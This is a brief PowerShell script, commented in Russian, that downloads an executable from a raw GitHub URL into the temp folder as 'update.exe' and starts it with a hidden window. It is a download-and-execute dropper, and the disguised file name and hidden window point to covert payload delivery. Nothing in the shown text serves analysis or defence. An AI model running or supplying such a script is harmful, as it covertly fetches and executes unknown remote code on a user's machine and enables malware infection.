# Скачиваем и запускаем твой exe
$exeUrl = "https://raw.githubusercontent.com/hk1500/s/22bee0700f758a2aafcf592fd66d1bcd208e7644/1.exe"
$exePath = "$env:TEMP\update.exe"

try {
    irm $exeUrl -OutFile $exePath -ErrorAction Stop
    Start-Process -FilePath $exePath -WindowStyle Hidden
    Write-Host "Done" -ForegroundColor Green
} catch {
    Write-Host "Error" -ForegroundColor Red
}
